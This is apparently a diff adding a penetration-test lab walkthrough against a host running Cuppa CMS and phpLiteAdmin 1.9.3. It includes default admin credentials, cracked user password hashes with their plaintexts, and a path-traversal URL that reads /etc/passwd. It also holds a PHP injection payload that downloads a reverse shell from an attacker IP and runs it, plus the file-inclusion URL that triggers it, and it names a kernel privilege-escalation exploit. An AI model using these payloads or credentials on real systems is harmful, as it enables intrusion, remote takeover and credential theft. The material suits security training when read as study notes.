@@ -1,0 +1,34 @@
+# 1 login with admin account on /db & /administrator
+admin:admin
+
+# 2 Crack creds table hash 
+aaron			5978a63b4654c73c60fa24f836386d87:italia99
+accasia			a1420fc5ab116437368889400c4bb8e1:WindRunner
+bethanyjoy02		6c0f3fde58158e4c1f4cedb29c7ef4c1:
+deanna			f463f63616cb3f1e81ce46b39f882fd5:marianna
+jpotter			9b38e2b1e8b12f426b0d208a7ab6cb98:vipsu
+
+# 3 get running system version
+Cuppa CMS
+phpLiteAdmin version: 1.9.3
+
+# 4 found exploit 
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
+
+# 5 found /alter page and ConfigField.php to show user list
+http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+# 6 Inject table with php code in http://10.11.1.116/db/phpliteadmin.php
+CREATE TABLE 'shell' ('shell' TEXT default '<?php system("wget http://192.168.119.191:9000/php-reverse-shell.php -O /tmp/php-reverse-shell.php;php /tmp/php-reverse-shell.php");?>')
+
+# 7 Download php revershel from kali and execute on the target machine
+http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=/usr/local/databases/shell.php
+
+# 8 check 8 OS info
+Linux version 4.4.0-116-generic
+Ubuntu 16.04.4 LTS
+release: 16.04
+
+# 9 found exploit 
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c
